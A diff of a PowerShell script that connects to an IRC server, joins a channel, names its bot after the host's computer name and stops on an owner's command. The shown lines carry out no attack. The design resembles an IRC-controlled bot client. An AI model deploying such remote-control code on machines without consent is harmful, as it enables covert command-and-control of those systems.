@@ -1,9 +1,12 @@
 $server = "chat.freenode.net"
 $port   = 6667
-$bot = "bot-theo-script"
+$bot = "BOT-" + $env:COMPUTERNAME
 $channel = "#SCRIPT-POWERSHELL"
 $owner = "The-oo"
 $date = Get-Date
+
+
+
 # Connect-session
 $TCPClient = new-object Net.Sockets.TcpClient
 $TCPClient.Connect($server, $port)
@@ -49,6 +52,9 @@ do {
 do {
     $read = $reader.ReadLine();
     write-host $read  
+
+
+
 
     if ($read -like '*stop_powershell*') {
         if($read -like '*' + $owner + '*') {
